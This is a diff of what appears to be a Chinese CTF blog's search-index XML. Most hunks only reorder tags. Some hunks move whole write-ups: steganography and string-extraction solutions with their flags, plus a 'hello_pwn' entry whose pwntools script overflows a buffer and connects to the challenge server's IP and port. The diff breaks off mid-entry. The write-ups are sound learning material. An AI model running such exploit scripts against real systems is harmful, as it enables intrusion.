@@ -99,9 +99,9 @@
       
         <tags>
             
-            <tag> CTF刷题 </tag>
-            
             <tag> CTF笔记 </tag>
+            
+            <tag> CTF刷题 </tag>
             
             <tag> REVERSE </tag>
             
@@ -128,9 +128,9 @@
       
         <tags>
             
-            <tag> MISC </tag>
-            
             <tag> CTF笔记 </tag>
+            
+            <tag> MISC </tag>
             
         </tags>
       
@@ -155,9 +155,9 @@
       
         <tags>
             
-            <tag> MISC </tag>
-            
             <tag> CTF笔记 </tag>
+            
+            <tag> MISC </tag>
             
         </tags>
       
@@ -182,9 +182,9 @@
       
         <tags>
             
-            <tag> MISC </tag>
-            
             <tag> CTF笔记 </tag>
+            
+            <tag> MISC </tag>
             
         </tags>
       
@@ -209,9 +209,9 @@
       
         <tags>
             
-            <tag> MISC </tag>
-            
             <tag> CTF笔记 </tag>
+            
+            <tag> MISC </tag>
             
         </tags>
       
@@ -236,9 +236,9 @@
       
         <tags>
             
-            <tag> MISC </tag>
-            
             <tag> CTF笔记 </tag>
+            
+            <tag> MISC </tag>
             
         </tags>
       
@@ -371,9 +371,9 @@
       
         <tags>
             
-            <tag> CTF刷题 </tag>
-            
             <tag> MISC </tag>
+            
+            <tag> CTF刷题 </tag>
             
         </tags>
       
@@ -398,9 +398,9 @@
       
         <tags>
             
-            <tag> CTF刷题 </tag>
-            
             <tag> MISC </tag>
+            
+            <tag> CTF刷题 </tag>
             
         </tags>
       
@@ -425,9 +425,9 @@
       
         <tags>
             
-            <tag> CTF刷题 </tag>
-            
             <tag> MISC </tag>
+            
+            <tag> CTF刷题 </tag>
             
         </tags>
       
@@ -452,63 +452,9 @@
       
         <tags>
             
-            <tag> CTF刷题 </tag>
-            
             <tag> MISC </tag>
             
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>攻防世界-hit-the-core</title>
-      <link href="/2023/03/19/CTF%20-%20Misc_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hit-the-core/"/>
-      <url>/2023/03/19/CTF%20-%20Misc_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hit-the-core/</url>
-      
-        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><mark>给出形式很像 flag 的字符串时，注意观察大写、小写、数字、符号之间有没有什么规律</mark></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/8deb5f0c2cd84143807b6175f58d6f3f.core">攻防世界-hit-the-core</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>下载得到一个 .core 文件，但用 exeinfo PE 查看发现是 64位 elf 可执行文件：<br><img src="https://s2.loli.net/2023/03/18/1CEFVKyqmactr5u.png" alt="攻防世界-hit-the-core1.png"></p></li><li><p>在 ubuntu 下执行失败：<br><img src="https://s2.loli.net/2023/03/18/YAVrLlPgGIZdC8q.png" alt="攻防世界-hit-the-core2.png"></p></li><li><p>在 IDA 中查看发现一串字符：<br><img src="https://s2.loli.net/2023/03/18/hGv4ODRmfVQtPUZ.png" alt="攻防世界-hit-the-core3.png"><br>格式很像 flag，但尝试后发现不对：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc&#123;bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong><em>发现这段 flag 很有规律，如果每 5 位看成一组，在每组的第 4 位就有一个大写字母，而其他的都是小写</em></strong><br><strong><em>尝试将每 5 组的第 4 位提取出来</em></strong>：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">ALEXCTF&#123;K33P_7H3_g00D_w0rk_up&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>尝试后发现获得 flag</p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>ALEXCTF{K33P_7H3_g00D_w0rk_up}</p></blockquote>]]></content>
-      
-      
-      <categories>
-          
-          <category> 杂项 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
             <tag> CTF刷题 </tag>
-            
-            <tag> MISC </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>攻防世界-misc_pic_again</title>
-      <link href="/2023/03/19/CTF%20-%20Misc_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc_pic_again/"/>
-      <url>/2023/03/19/CTF%20-%20Misc_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc_pic_again/</url>
-      
-        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>熟悉 LSB 隐写</mark>，<mark>熟悉 zsteg 的相关分析结果的意思以及提取指令</mark></p></li><li><p><mark>熟悉 Stegsolve 的使用</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/719af25af2ca4707972c6ae57060238e.png">攻防世界-misc_pic_again</a></p><hr><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><ol><li><p>解压得到一张图片，图片没有异常：<br><img src="https://s2.loli.net/2023/03/18/2hcXLCq6la3mBIY.png" alt="攻防世界-misc_pic_again1.png"></p></li><li><p>在 kali 下用 <code>zsteg</code> 分析图片：<br><img src="https://s2.loli.net/2023/03/18/W4dLpPA5bwM3Vse.png" alt="攻防世界-misc_pic_again2.png"><br>发现分析结果中藏有 Zip 文件</p></li><li><p>提取 Zip 文件：<br><img src="https://s2.loli.net/2023/03/18/X1vF9GYIAnUWriO.png" alt="攻防世界-misc_pic_again3.png"><br>解压 1.zip 后得到一个可执行文件 1<br><img src="https://s2.loli.net/2023/03/18/34vqmy8SgXAG1tJ.png" alt="攻防世界-misc_pic_again4.png"><br>增加执行权限 <code>chmod a+x 1</code> 后，执行该文件，错误：<br><img src="https://s2.loli.net/2023/03/18/wqntTivXIoEF6OA.png" alt="攻防世界-misc_pic_again5.png"></p></li><li><p>查看文件 1 的字符串：<br><img src="https://s2.loli.net/2023/03/18/mWJuc7Nw4epb5Xt.png" alt="攻防世界-misc_pic_again6.png"><br>得到 flag</p></li></ol><hr><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ol><li><p>利用 Stegsolve 打开：<code>java -jar Stegsolve.jar</code><br><img src="https://s2.loli.net/2023/03/18/zYoseVpL3NnyHxE.png" alt="攻防世界-misc_pic_again7.png"></p></li><li><p>用 LSB 分析：<br><img src="https://s2.loli.net/2023/03/18/qOtIYPnJ8jLZNgE.png" alt="攻防世界-misc_pic_again8.png"><br>输入参数：<br><img src="https://s2.loli.net/2023/03/18/RYoa8OA21zEr9bq.png" alt="攻防世界-misc_pic_again9.png"><br>根据十六进制数据发现 <code>PK</code>，该文件是一个 <code>zip</code> 压缩包，直接将文件另存为 1.zip：<br><img src="https://s2.loli.net/2023/03/18/LGauWoRdxEYXeJ3.png" alt="攻防世界-misc_pic_again10.png"><br>解压后得到一个 elf 可执行文件：<br><img src="https://s2.loli.net/2023/03/18/gTJwGmp8sHei3rz.png" alt="攻防世界-misc_pic_again11.png"></p></li><li><p>后续同思路一，在 linux 下 <code>strings 1</code> 得到 flag</p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>hctf{scxdc3tok3yb0ard4g41n~~~}</p></blockquote>]]></content>
-      
-      
-      <categories>
-          
-          <category> 杂项 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> CTF刷题 </tag>
-            
-            <tag> MISC </tag>
             
         </tags>
       
@@ -533,9 +479,63 @@
       
         <tags>
             
+            <tag> MISC </tag>
+            
             <tag> CTF刷题 </tag>
             
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>攻防世界-misc_pic_again</title>
+      <link href="/2023/03/19/CTF%20-%20Misc_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc_pic_again/"/>
+      <url>/2023/03/19/CTF%20-%20Misc_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-misc_pic_again/</url>
+      
+        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>熟悉 LSB 隐写</mark>，<mark>熟悉 zsteg 的相关分析结果的意思以及提取指令</mark></p></li><li><p><mark>熟悉 Stegsolve 的使用</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/719af25af2ca4707972c6ae57060238e.png">攻防世界-misc_pic_again</a></p><hr><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><ol><li><p>解压得到一张图片，图片没有异常：<br><img src="https://s2.loli.net/2023/03/18/2hcXLCq6la3mBIY.png" alt="攻防世界-misc_pic_again1.png"></p></li><li><p>在 kali 下用 <code>zsteg</code> 分析图片：<br><img src="https://s2.loli.net/2023/03/18/W4dLpPA5bwM3Vse.png" alt="攻防世界-misc_pic_again2.png"><br>发现分析结果中藏有 Zip 文件</p></li><li><p>提取 Zip 文件：<br><img src="https://s2.loli.net/2023/03/18/X1vF9GYIAnUWriO.png" alt="攻防世界-misc_pic_again3.png"><br>解压 1.zip 后得到一个可执行文件 1<br><img src="https://s2.loli.net/2023/03/18/34vqmy8SgXAG1tJ.png" alt="攻防世界-misc_pic_again4.png"><br>增加执行权限 <code>chmod a+x 1</code> 后，执行该文件，错误：<br><img src="https://s2.loli.net/2023/03/18/wqntTivXIoEF6OA.png" alt="攻防世界-misc_pic_again5.png"></p></li><li><p>查看文件 1 的字符串：<br><img src="https://s2.loli.net/2023/03/18/mWJuc7Nw4epb5Xt.png" alt="攻防世界-misc_pic_again6.png"><br>得到 flag</p></li></ol><hr><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ol><li><p>利用 Stegsolve 打开：<code>java -jar Stegsolve.jar</code><br><img src="https://s2.loli.net/2023/03/18/zYoseVpL3NnyHxE.png" alt="攻防世界-misc_pic_again7.png"></p></li><li><p>用 LSB 分析：<br><img src="https://s2.loli.net/2023/03/18/qOtIYPnJ8jLZNgE.png" alt="攻防世界-misc_pic_again8.png"><br>输入参数：<br><img src="https://s2.loli.net/2023/03/18/RYoa8OA21zEr9bq.png" alt="攻防世界-misc_pic_again9.png"><br>根据十六进制数据发现 <code>PK</code>，该文件是一个 <code>zip</code> 压缩包，直接将文件另存为 1.zip：<br><img src="https://s2.loli.net/2023/03/18/LGauWoRdxEYXeJ3.png" alt="攻防世界-misc_pic_again10.png"><br>解压后得到一个 elf 可执行文件：<br><img src="https://s2.loli.net/2023/03/18/gTJwGmp8sHei3rz.png" alt="攻防世界-misc_pic_again11.png"></p></li><li><p>后续同思路一，在 linux 下 <code>strings 1</code> 得到 flag</p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>hctf{scxdc3tok3yb0ard4g41n~~~}</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> 杂项 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
             <tag> MISC </tag>
+            
+            <tag> CTF刷题 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>攻防世界-hit-the-core</title>
+      <link href="/2023/03/19/CTF%20-%20Misc_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hit-the-core/"/>
+      <url>/2023/03/19/CTF%20-%20Misc_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hit-the-core/</url>
+      
+        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><mark>给出形式很像 flag 的字符串时，注意观察大写、小写、数字、符号之间有没有什么规律</mark></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/8deb5f0c2cd84143807b6175f58d6f3f.core">攻防世界-hit-the-core</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>下载得到一个 .core 文件，但用 exeinfo PE 查看发现是 64位 elf 可执行文件：<br><img src="https://s2.loli.net/2023/03/18/1CEFVKyqmactr5u.png" alt="攻防世界-hit-the-core1.png"></p></li><li><p>在 ubuntu 下执行失败：<br><img src="https://s2.loli.net/2023/03/18/YAVrLlPgGIZdC8q.png" alt="攻防世界-hit-the-core2.png"></p></li><li><p>在 IDA 中查看发现一串字符：<br><img src="https://s2.loli.net/2023/03/18/hGv4ODRmfVQtPUZ.png" alt="攻防世界-hit-the-core3.png"><br>格式很像 flag，但尝试后发现不对：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc&#123;bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong><em>发现这段 flag 很有规律，如果每 5 位看成一组，在每组的第 4 位就有一个大写字母，而其他的都是小写</em></strong><br><strong><em>尝试将每 5 组的第 4 位提取出来</em></strong>：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">ALEXCTF&#123;K33P_7H3_g00D_w0rk_up&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>尝试后发现获得 flag</p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>ALEXCTF{K33P_7H3_g00D_w0rk_up}</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> 杂项 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MISC </tag>
+            
+            <tag> CTF刷题 </tag>
             
         </tags>
       
@@ -560,9 +560,9 @@
       
         <tags>
             
-            <tag> CTF刷题 </tag>
-            
             <tag> MISC </tag>
+            
+            <tag> CTF刷题 </tag>
             
         </tags>
       
@@ -587,36 +587,9 @@
       
         <tags>
             
-            <tag> CTF刷题 </tag>
-            
             <tag> PWN </tag>
             
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>攻防世界-hello_pwn</title>
-      <link href="/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello_pwn/"/>
-      <url>/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello_pwn/</url>
-      
-        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>基础的<mark>栈溢出漏洞</mark></p></li><li><p>熟悉 <mark>exp 的编写</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/4f2f44c9471d4dc2b59768779e378282">攻防世界-hello_pwn</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/ulK38iMZRyt7GJX.png" alt="攻防世界-hello_pwn1.png"><br>64位 小端序，只开启了栈保护，没有金丝雀</p></li><li><p>尝试执行：<br><img src="https://s2.loli.net/2023/03/18/EZ9ucXyBGk67rlS.png" alt="攻防世界-hello_pwn2.png"></p></li><li><p>在 IDA 中分析：<br><img src="https://s2.loli.net/2023/03/18/rAhIFBY7SXEZRGt.png" alt="攻防世界-hello_pwn3.png"><br>通过 <code>read()</code> 从命令行向 <code>unk_601068</code> 的地址处写入 0x10 个值，如果 <code>dword_60106C == 1853186401</code>，就执行 <code>sub_400686()</code> 函数，跟进：<br><img src="https://s2.loli.net/2023/03/18/KwHTAj4QrixDSW6.png" alt="攻防世界-hello_pwn4.png"><br><code>sub_400686()</code> 函数直接 <code>cat flag.txt</code></p></li><li><p>因此，只需要将 <code>dword_60106C</code> 的值设置为 1853186401 就可以得到 flag<br>查看 <code>dword_60106C</code> 存放的位置：<br><img src="https://s2.loli.net/2023/03/18/FvESGUiWz3IsY5c.png" alt="攻防世界-hello_pwn5.png"><br>可以看到 read() 输入的值存放在 <code>unk_601068</code> 的地方就在 <code>dword_60106C</code> 的上方，而 read() 输入的长度为 0x10，因此只需在输入 <code>unk_601068</code> 时溢出修改 <code>dword_60106C</code> 的值即可</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span> <span class="token punctuation">,</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>   <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>   <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./hello_pwn"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">58615</span><span class="token punctuation">)</span>   <span class="token comment"># 题目的远程端口</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x60106C</span> <span class="token operator">-</span> <span class="token number">0x601068</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1853186401</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"lets get helloworld for bof\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{ff873b571a60849c4df0f263789a392c}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/VawQFHjstdmD5Rk.png" alt="攻防世界-hello_pwn6.png"></p><p>执行了 <code>cat: flag.txt: 没有那个文件或目录</code>，说明本地已经 PWN 通，将 comtent 改为 0：<br><img src="https://s2.loli.net/2023/03/18/STH1NifdcrDQEOe.png" alt="攻防世界-hello_pwn7.png"><br>获得 flag</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 二进制漏洞利用 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
             <tag> CTF刷题 </tag>
-            
-            <tag> PWN </tag>
             
         </tags>
       
@@ -641,9 +614,36 @@
       
         <tags>
             
+            <tag> PWN </tag>
+            
             <tag> CTF刷题 </tag>
             
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>攻防世界-hello_pwn</title>
+      <link href="/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello_pwn/"/>
+      <url>/2023/03/19/CTF%20-%20Pwn_Writeup/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-hello_pwn/</url>
+      
+        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>基础的<mark>栈溢出漏洞</mark></p></li><li><p>熟悉 <mark>exp 的编写</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/4f2f44c9471d4dc2b59768779e378282">攻防世界-hello_pwn</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>查看文件信息：<br><img src="https://s2.loli.net/2023/03/18/ulK38iMZRyt7GJX.png" alt="攻防世界-hello_pwn1.png"><br>64位 小端序，只开启了栈保护，没有金丝雀</p></li><li><p>尝试执行：<br><img src="https://s2.loli.net/2023/03/18/EZ9ucXyBGk67rlS.png" alt="攻防世界-hello_pwn2.png"></p></li><li><p>在 IDA 中分析：<br><img src="https://s2.loli.net/2023/03/18/rAhIFBY7SXEZRGt.png" alt="攻防世界-hello_pwn3.png"><br>通过 <code>read()</code> 从命令行向 <code>unk_601068</code> 的地址处写入 0x10 个值，如果 <code>dword_60106C == 1853186401</code>，就执行 <code>sub_400686()</code> 函数，跟进：<br><img src="https://s2.loli.net/2023/03/18/KwHTAj4QrixDSW6.png" alt="攻防世界-hello_pwn4.png"><br><code>sub_400686()</code> 函数直接 <code>cat flag.txt</code></p></li><li><p>因此，只需要将 <code>dword_60106C</code> 的值设置为 1853186401 就可以得到 flag<br>查看 <code>dword_60106C</code> 存放的位置：<br><img src="https://s2.loli.net/2023/03/18/FvESGUiWz3IsY5c.png" alt="攻防世界-hello_pwn5.png"><br>可以看到 read() 输入的值存放在 <code>unk_601068</code> 的地方就在 <code>dword_60106C</code> 的上方，而 read() 输入的长度为 0x10，因此只需在输入 <code>unk_601068</code> 时溢出修改 <code>dword_60106C</code> 的值即可</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span> <span class="token punctuation">,</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>   <span class="token comment"># 打印调试信息</span>content <span class="token operator">=</span> <span class="token number">0</span>   <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./hello_pwn"</span><span class="token punctuation">)</span>   <span class="token comment"># 程序在kali的路径</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">58615</span><span class="token punctuation">)</span>   <span class="token comment"># 题目的远程端口</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x60106C</span> <span class="token operator">-</span> <span class="token number">0x601068</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1853186401</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"lets get helloworld for bof\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>cyberpeace{ff873b571a60849c4df0f263789a392c}</p></blockquote><p><img src="https://s2.loli.net/2023/03/18/VawQFHjstdmD5Rk.png" alt="攻防世界-hello_pwn6.png"></p><p>执行了 <code>cat: flag.txt: 没有那个文件或目录</code>，说明本地已经 PWN 通，将 comtent 改为 0：<br><img src="https://s2.loli.net/2023/03/18/STH1NifdcrDQEOe.png" alt="攻防世界-hello_pwn7.png"><br>获得 flag</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 二进制漏洞利用 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
             <tag> PWN </tag>
+            
+            <tag> CTF刷题 </tag>
             
         </tags>
       
@@ -668,9 +668,9 @@
       
         <tags>
             
-            <tag> CTF刷题 </tag>
-            
             <tag> PWN </tag>
+            
+            <tag> CTF刷题 </tag>
             
         </tags>
       
@@ -695,9 +695,9 @@
       
         <tags>
             
-            <tag> CTF刷题 </tag>
-            
             <tag> PWN </tag>
+            
+            <tag> CTF刷题 </tag>
             
         </tags>
       
@@ -722,9 +722,9 @@
       
         <tags>
             
-            <tag> CTF刷题 </tag>
-            
             <tag> PWN </tag>
+            
+            <tag> CTF刷题 </tag>
             
         </tags>
       
@@ -749,9 +749,9 @@
       
         <tags>
             
-            <tag> CTF刷题 </tag>
-            
             <tag> PWN </tag>
+            
+            <tag> CTF刷题 </tag>
             
         </tags>
       
@@ -776,9 +776,9 @@
       
         <tags>
             
-            <tag> CTF刷题 </tag>
-            
             <tag> PWN </tag>
+            
+            <tag> CTF刷题 </tag>
             
         </tags>
       
@@ -803,9 +803,9 @@
       
         <tags>
             
-            <tag> CTF刷题 </tag>
-            
             <tag> PWN </tag>
+            
+            <tag> CTF刷题 </tag>
             
         </tags>
       
@@ -830,9 +830,9 @@
       
         <tags>
             
-            <tag> CTF刷题 </tag>
-            
             <tag> PWN </tag>
+            
+            <tag> CTF刷题 </tag>
             
         </tags>
       
@@ -1435,11 +1435,11 @@
     
     
     <entry>
-      <title>Linux下的操作命令</title>
-      <link href="/2023/03/19/Linux/Linux%E4%B8%8B%E7%9A%84%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/"/>
-      <url>/2023/03/19/Linux/Linux%E4%B8%8B%E7%9A%84%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/</url>
+      <title>GCC编译过程</title>
+      <link href="/2023/03/19/Linux/GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/"/>
+      <url>/2023/03/19/Linux/GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/</url>
       
-        <content type="html"><![CDATA[<h2 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h2><blockquote><p>一个点（<code>./</code>），代表本级目录<br>两个点（<code>../</code>），代表上级目录</p></blockquote><hr><h2 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h2><blockquote><p><code>cat &lt;文件名&gt;</code></p></blockquote><hr><h2 id="转到盘符-目录"><a href="#转到盘符-目录" class="headerlink" title="转到盘符/目录"></a>转到盘符/目录</h2><blockquote><p><code>cd E:</code><br><code>cd &lt;路径名&gt;</code></p></blockquote><hr><h2 id="显示目录中的文件"><a href="#显示目录中的文件" class="headerlink" title="显示目录中的文件"></a>显示目录中的文件</h2><blockquote><p><code>ls &lt;目录名&gt;</code>（仅显示可见文件）<br><code>ls -a</code>（显示所有文件，包括隐藏文件）<br><code>ll</code>（显示详细信息）</p></blockquote><hr><h2 id="文件重命名"><a href="#文件重命名" class="headerlink" title="文件重命名"></a>文件重命名</h2><blockquote><p><code>mv &lt;文件名1&gt; &lt;文件名2&gt;</code></p><p>1.文件被命名为 <code>.</code> 开头时，如 <code>.flag</code>，则 <code>flag</code> 为隐藏文件，<code>ls</code> 无法查看，需用 <code>ls -a</code> 才可以看到<br>2.将隐藏文件重命名去掉开头的 <code>.</code> 时，文件恢复可见</p></blockquote><hr><h2 id="编辑文档"><a href="#编辑文档" class="headerlink" title="编辑文档"></a>编辑文档</h2><blockquote><p><code>vim &lt;文件名&gt;</code><br><code>i</code>（进入编辑模式）<br><code>esc</code>（退出编辑模式）<br><code>:q</code>（退出，但不保存）<br><code>:wq</code>（保存并退出）<br><code>esc</code> <code>u</code>（撤销之前的操作）</p></blockquote><hr><h2 id="给文件增加可执行权限"><a href="#给文件增加可执行权限" class="headerlink" title="给文件增加可执行权限"></a>给文件增加可执行权限</h2><blockquote><p><code>chmod a+x &lt;文件名&gt;</code></p></blockquote><hr><h2 id="运行-elf-可执行文件"><a href="#运行-elf-可执行文件" class="headerlink" title="运行 elf 可执行文件"></a>运行 elf 可执行文件</h2><blockquote><p><code>./ &lt;文件名&gt;</code></p></blockquote><hr><h2 id="运行-python-程序"><a href="#运行-python-程序" class="headerlink" title="运行 python 程序"></a>运行 python 程序</h2><blockquote><p><code>python3 &lt;文件名&gt;</code></p></blockquote><hr><h2 id="运行-C-代码"><a href="#运行-C-代码" class="headerlink" title="运行 C 代码"></a>运行 C 代码</h2><blockquote><p><code>gcc &lt;.c文件名&gt; -o &lt;编译生成的文件名&gt;</code><br><code>./&lt;编译生成的文件名&gt;</code></p></blockquote><hr><h2 id="复制-文件-文件夹"><a href="#复制-文件-文件夹" class="headerlink" title="复制 文件/文件夹"></a>复制 文件/文件夹</h2><blockquote><p><code>cp &lt;源文件/源文件夹 路径&gt; &lt;复制到 文件/文件夹&gt;</code></p></blockquote><hr><h2 id="移动、重命名-文件-文件夹"><a 